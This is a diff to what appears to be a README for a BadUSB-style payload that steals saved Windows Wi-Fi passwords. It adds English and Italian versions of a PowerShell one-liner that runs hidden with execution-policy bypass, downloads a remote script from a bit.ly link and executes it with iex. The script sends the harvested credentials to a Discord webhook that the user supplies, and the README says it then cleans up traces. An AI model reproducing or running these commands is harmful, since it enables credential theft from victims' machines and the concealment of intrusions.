@@ -28,8 +28,14 @@ Then it cleans up traces of what you have done after.
 * Invoke 2 netsh commands
 * Invoke-WebRequest will be entered in the Run Box to send the content
 
+ENG 🇺🇸
 ```powershell
-powershell -w h -ep bypass $discord='<your-webhook-here>';irm bit.ly/WLAN-Windows-Password | iex
+powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/ENG-WLAN-Windows-Password | iex
+```
+
+ITA 🇮🇹
+```powershell
+powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/ITA-Windows-Passwords | iex
 ```
 
 You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
